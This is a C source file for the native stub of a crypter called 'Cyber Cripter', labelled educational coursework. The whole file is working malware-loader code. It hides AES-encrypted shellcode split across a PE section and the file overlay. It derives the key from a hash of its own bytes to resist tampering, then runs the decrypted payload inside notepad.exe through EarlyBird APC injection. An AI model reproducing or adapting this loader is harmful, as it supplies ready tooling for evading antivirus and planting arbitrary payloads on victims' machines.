/*
 * Cyber Cripter — native stub (educational coursework).
 *
 * This binary is the pre-compiled template that the C# builder patches.
 * The on-disk layout, after patching, is:
 *
 *   .cdata section (initialized const data, mapped read-only at runtime):
 *     g_meta        — StubMetadata (heap_marker, timestamp, IV, sizes,
 *                                   hash_region_size). Located via METADATA_MAGIC.
 *     g_half1_buf   — magic-prefixed buffer holding ciphertext half1.
 *                     Located via HALF1_MAGIC. Capacity HALF1_MAX bytes.
 *
 *   PE overlay (raw bytes after the last section):
 *     ciphertext half2 (size given in g_meta.half2_size).
 *
 * Runtime flow:
 *   1. Read self file from disk.
 *   2. Re-derive AES-256 key:
 *         key = SHA256( heap_marker || self_bytes[0..hash_region] || timestamp )
 *      The stub bytes in the hash provide anti-tamper: any modification of the
 *      hashed prefix invalidates the key and decryption fails.
 *   3. Reassemble ciphertext = half1 || half2.
 *   4. AES-256-CBC decrypt with PKCS#7 padding -> shellcode (Donut output).
 *   5. EarlyBird APC injection into a suspended notepad.exe process.
 */

#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <bcrypt.h>

#pragma comment(lib, "bcrypt.lib")

#define HALF1_MAX 0x100000  /* 1 MiB embedded ciphertext capacity */

#pragma pack(push, 1)
typedef struct {
    unsigned char      magic[16];
    unsigned char      heap_marker[8];
    unsigned long long timestamp;
    unsigned char      iv[16];
    unsigned int       half1_size;
    unsigned int       half2_size;
    unsigned int       hash_region_size;
} StubMetadata;
#pragma pack(pop)

#pragma section(".cdata", read)

__declspec(allocate(".cdata"))
volatile const StubMetadata g_meta = {
    /* magic            */ { 'M','E','T','A','!','C','R','Y','p','T','e','R','!',
                              0xAA, 0xBB, 0xCC },
    /* heap_marker      */ { 0, 0, 0, 0, 0, 0, 0, 0 },
    /* timestamp        */ 0,
    /* iv               */ { 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0 },
    /* half1_size       */ 0,
    /* half2_size       */ 0,
    /* hash_region_size */ 0
};

__declspec(allocate(".cdata"))
volatile const unsigned char g_half1_buf[16 + HALF1_MAX] = {
    'H','A','L','F','!','O','N','E','!','D','A','T','A', 0xDD, 0xEE, 0xFF
    /* remaining HALF1_MAX bytes are implicitly zero-initialized but kept
       on disk because the array as a whole is initialized */
};

/* ---------- minimal helpers (no CRT dependency) ---------- */

static void *xalloc(SIZE_T n) { return HeapAlloc(GetProcessHeap(), 0, n); }
static void  xfree(void *p)   { if (p) HeapFree(GetProcessHeap(), 0, p); }

static void xcopy(void *dst, const void *src, SIZE_T n)
{
    unsigned char *d = (unsigned char *)dst;
    const unsigned char *s = (const unsigned char *)src;
    while (n--) *d++ = *s++;
}

static void xzero(void *p, SIZE_T n)
{
    volatile unsigned char *d = (volatile unsigned char *)p;
    while (n--) *d++ = 0;
}

/* ---------- read self from disk ---------- */

static int read_self(unsigned char **out, DWORD *out_size)
{
    char path[MAX_PATH];
    DWORD pl = GetModuleFileNameA(NULL, path, MAX_PATH);
    if (pl == 0 || pl >= MAX_PATH) return 0;

    HANDLE h = CreateFileA(path, GENERIC_READ, FILE_SHARE_READ, NULL,
                           OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (h == INVALID_HANDLE_VALUE) return 0;

    LARGE_INTEGER fs;
    if (!GetFileSizeEx(h, &fs) || fs.QuadPart > 0x10000000) { /* 256 MB cap */
        CloseHandle(h); return 0;
    }
    DWORD size = (DWORD)fs.QuadPart;
    unsigned char *buf = (unsigned char *)xalloc(size);
    if (!buf) { CloseHandle(h); return 0; }

    DWORD got = 0;
    if (!ReadFile(h, buf, size, &got, NULL) || got != size) {
        xfree(buf); CloseHandle(h); return 0;
    }
    CloseHandle(h);
    *out = buf; *out_size = size;
    return 1;
}

/* ---------- SHA-256 via CNG ---------- */

static int cng_sha256(const unsigned char *in, DWORD in_len, unsigned char out[32])
{
    BCRYPT_ALG_HANDLE  hAlg  = NULL;
    BCRYPT_HASH_HANDLE hHash = NULL;
    int ok = 0;

    if (BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_SHA256_ALGORITHM, NULL, 0) != 0) return 0;
    if (BCryptCreateHash(hAlg, &hHash, NULL, 0, NULL, 0, 0) != 0) goto end;
    if (BCryptHashData(hHash, (PUCHAR)in, in_len, 0) != 0)        goto end;
    if (BCryptFinishHash(hHash, out, 32, 0) != 0)                 goto end;
    ok = 1;
end:
    if (hHash) BCryptDestroyHash(hHash);
    if (hAlg)  BCryptCloseAlgorithmProvider(hAlg, 0);
    return ok;
}

/* ---------- AES-256-CBC decrypt (PKCS#7) via CNG ---------- */

static int cng_aes256cbc_decrypt(const unsigned char key[32],
                                 const unsigned char iv_in[16],
                                 const unsigned char *ct, DWORD ct_len,
                                 unsigned char **out, DWORD *out_len)
{
    BCRYPT_ALG_HANDLE hAlg = NULL;
    BCRYPT_KEY_HANDLE hKey = NULL;
    unsigned char iv[16];
    unsigned char *pt = NULL;
    DWORD plen = 0;
    int ok = 0;

    if (BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, NULL, 0) != 0) return 0;
    if (BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE,
                          (PUCHAR)BCRYPT_CHAIN_MODE_CBC,
                          sizeof(BCRYPT_CHAIN_MODE_CBC), 0) != 0) goto end;
    if (BCryptGenerateSymmetricKey(hAlg, &hKey, NULL, 0,
                                   (PUCHAR)key, 32, 0) != 0) goto end;

    xcopy(iv, iv_in, 16);
    if (BCryptDecrypt(hKey, (PUCHAR)ct, ct_len, NULL, iv, 16,
                      NULL, 0, &plen, BCRYPT_BLOCK_PADDING) != 0) goto end;
    pt = (unsigned char *)xalloc(plen);
    if (!pt) goto end;
    xcopy(iv, iv_in, 16); /* BCryptDecrypt mutates the IV; reseed it */
    if (BCryptDecrypt(hKey, (PUCHAR)ct, ct_len, NULL, iv, 16,
                      pt, plen, &plen, BCRYPT_BLOCK_PADDING) != 0) {
        xfree(pt); pt = NULL; goto end;
    }
    *out = pt; *out_len = plen;
    ok = 1;
end:
    if (hKey) BCryptDestroyKey(hKey);
    if (hAlg) BCryptCloseAlgorithmProvider(hAlg, 0);
    return ok;
}

/* ---------- EarlyBird APC injection into notepad.exe ---------- */

static int eb_apc_inject(const unsigned char *sc, SIZE_T sc_len)
{
    STARTUPINFOA        si;
    PROCESS_INFORMATION pi;
    char target[] = "C:\\Windows\\System32\\notepad.exe";
    SIZE_T written = 0;
    LPVOID rmem = NULL;

    xzero(&si, sizeof(si));
    xzero(&pi, sizeof(pi));
    si.cb = sizeof(si);

    if (!CreateProcessA(target, NULL, NULL, NULL, FALSE,
                        CREATE_SUSPENDED, NULL, NULL, &si, &pi)) return 0;

    rmem = VirtualAllocEx(pi.hProcess, NULL, sc_len,
                          MEM_COMMIT | MEM_RESERVE,
                          PAGE_EXECUTE_READWRITE);
    if (!rmem) goto fail;

    if (!WriteProcessMemory(pi.hProcess, rmem, sc, sc_len, &written)
        || written != sc_len) goto fail;

    /* Queue the APC on the process's primary thread (still suspended).
       The APC fires when the thread enters an alertable wait — which
       happens early during the loader's startup of notepad.exe (NtTestAlert
       loop), giving us "EarlyBird" execution. */
    if (!QueueUserAPC((PAPCFUNC)rmem, pi.hThread, 0)) goto fail;

    ResumeThread(pi.hThread);
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    return 1;

fail:
    TerminateProcess(pi.hProcess, 1);
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    return 0;
}

/* ---------- entry ---------- */

int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrev, LPSTR lpCmd, int nShow)
{
    (void)hInst; (void)hPrev; (void)lpCmd; (void)nShow;

    unsigned char *self = NULL;
    DWORD self_size = 0;
    if (!read_self(&self, &self_size)) return 1;

    DWORD hr = g_meta.hash_region_size;
    DWORD h1 = g_meta.half1_size;
    DWORD h2 = g_meta.half2_size;

    if (hr == 0 || hr > self_size || h1 > HALF1_MAX || h2 > self_size
        || (h1 + h2) < h1) {
        xfree(self); return 2;
    }

    /* hash inputs:  heap_marker(8) || self[0..hr] || timestamp(8 LE) */
    DWORD hin_len = 8 + hr + 8;
    unsigned char *hin = (unsigned char *)xalloc(hin_len);
    if (!hin) { xfree(self); return 3; }
    xcopy(hin,            (const void *)g_meta.heap_marker, 8);
    xcopy(hin + 8,        self, hr);
    xcopy(hin + 8 + hr,   (const void *)&g_meta.timestamp, 8);

    unsigned char key[32];
    int ok = cng_sha256(hin, hin_len, key);
    xzero(hin, hin_len); xfree(hin);
    if (!ok) { xfree(self); return 4; }

    /* reassemble ciphertext: embedded half1 || overlay tail half2 */
    DWORD ct_len = h1 + h2;
    unsigned char *ct = (unsigned char *)xalloc(ct_len);
    if (!ct) { xzero(key, 32); xfree(self); return 5; }
    xcopy(ct,        (const void *)(g_half1_buf + 16), h1);
    xcopy(ct + h1,   self + (self_size - h2), h2);
    xfree(self);

    unsigned char iv[16];
    xcopy(iv, (const void *)g_meta.iv, 16);

    unsigned char *sc = NULL;
    DWORD sc_len = 0;
    ok = cng_aes256cbc_decrypt(key, iv, ct, ct_len, &sc, &sc_len);
    xzero(key, 32); xzero(iv, 16); xzero(ct, ct_len); xfree(ct);
    if (!ok) return 6;

    eb_apc_inject(sc, sc_len);
    xzero(sc, sc_len); xfree(sc);

    /* let the APC have time to do its work before we exit */
    Sleep(2000);
    return 0;
}
